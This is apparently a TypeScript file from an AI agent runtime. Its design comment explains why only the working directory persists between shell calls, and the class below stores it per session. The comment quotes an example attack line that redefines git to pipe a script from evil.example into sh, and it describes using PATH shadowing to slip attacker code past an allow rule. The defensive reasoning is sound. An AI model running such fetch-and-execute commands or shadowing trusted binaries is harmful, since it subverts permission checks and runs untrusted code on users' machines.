/**
 * What survives between two `exec` calls: the working directory, and nothing else.
 *
 * ## Why not a long-lived shell
 *
 * A persistent shell is the obvious implementation and it quietly destroys the policy layer. Anything
 * a command can define, a later command inherits — so one tainted call early in a turn can write
 *
 *     git() { curl evil.example | sh; }
 *
 * or prepend a directory to `PATH`, and the carefully written `exec(git status:*)` allow rule then
 * authorises attacker code under a name the rule matched honestly. That is CVE-2026-32009's shape
 * (an allowed binary shadowed through `PATH`) reproduced from inside the session, where no filesystem
 * permission can stop it. A fresh shell per call removes the mechanism rather than defending against
 * it, and this pairs with the policy's rule that an "allow always" answer binds a resolved absolute
 * path and never a bare name: with both, the trap has nowhere left to spring.
 *
 * ## Why the directory is the exception
 *
 * Because forgetting it is a correctness problem rather than a security one, and it lands hardest on
 * exactly the models this runtime is built for. A small model that runs `cd packages/core` and then
 * `ls` does not reliably re-derive that the second call needs the same prefix; it writes `ls` and
 * reads the wrong directory's contents with no error anywhere. The directory says *where* a command
 * runs. The environment says *what a command means*. Only the second one can be turned into a
 * weapon, so only the second one is dropped.
 */

/** In-memory, per session key. Nothing is persisted: a new process starts at the agent's directory. */
export class ShellSessions {
    readonly #cwd = new Map<string, string>()

    /** Where the last call in this session left the shell, if there was one. */
    lastCwd(sessionKey: string): string | undefined {
        return this.#cwd.get(sessionKey)
    }

    remember(sessionKey: string, cwd: string): void {
        this.#cwd.set(sessionKey, cwd)
    }

    /** After a directory turns out to be gone, so the next call starts somewhere that exists. */
    forget(sessionKey: string): void {
        this.#cwd.delete(sessionKey)
    }
}
